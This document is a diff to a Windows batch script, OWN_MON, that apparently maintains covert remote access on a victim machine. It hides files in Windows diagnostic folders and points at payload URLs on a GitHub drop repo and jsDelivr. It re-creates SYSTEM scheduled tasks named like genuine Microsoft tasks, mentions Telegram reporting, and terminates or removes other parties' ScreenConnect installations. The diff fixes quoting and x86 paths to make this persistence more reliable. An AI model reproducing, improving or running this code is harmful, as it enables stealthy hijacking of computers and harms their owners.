@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN_MON BUILD 20260802M6 - robust MSI + always nuke foreign + secure + TG
+REM OWN_MON BUILD 20260802M7 - quoted TR, x86 fix, robust MSI + nuke + TG
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
@@ -16,6 +16,7 @@ set "CB=%RANDOM%%RANDOM%"
 set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
 set "HOST=%COMPUTERNAME%"
+set "PF86=%ProgramFiles(x86)%"
 set "CURL=%SystemRoot%\System32\curl.exe"
 if not exist "%CURL%" set "CURL=curl.exe"
 
@@ -43,22 +44,22 @@ if exist "%TEMP%\tg_report_upd.ps1" for %%A in ("%TEMP%\tg_report_upd.ps1") do i
 REM --- self-rearm persist if someone deleted the tasks ---
 schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
   echo rearm_taskA>>"%LOG%"
 )
 schtasks /Query /TN "\Microsoft\Windows\PLA\Server" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%WD2%\etl_mon.cmd\"" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c ""%WD2%\etl_mon.cmd""" >nul 2>&1
   echo rearm_taskB>>"%LOG%"
 )
 schtasks /Query /TN "\Microsoft\Windows\WDI\ResolutionHost" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
   echo rearm_onstart>>"%LOG%"
 )
 schtasks /Query /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
   echo rearm_onlogon>>"%LOG%"
 )
 
@@ -195,7 +196,7 @@ for /f "tokens=2 delims=:" %%A in ('sc query state= all ^| findstr /C:"SERVICE_N
 )
 wmic process where "name='ScreenConnect.ClientService.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
 wmic process where "name='ScreenConnect.WindowsClient.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
-for %%R in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
+for %%R in ("%ProgramFiles%" "%PF86%") do (
   if exist "%%~R" for /d %%D in ("%%~R\ScreenConnect*") do (
     set "KEEP=0"
     echo %%~nxD | findstr /I "%KEEP1%" >nul && set "KEEP=1"
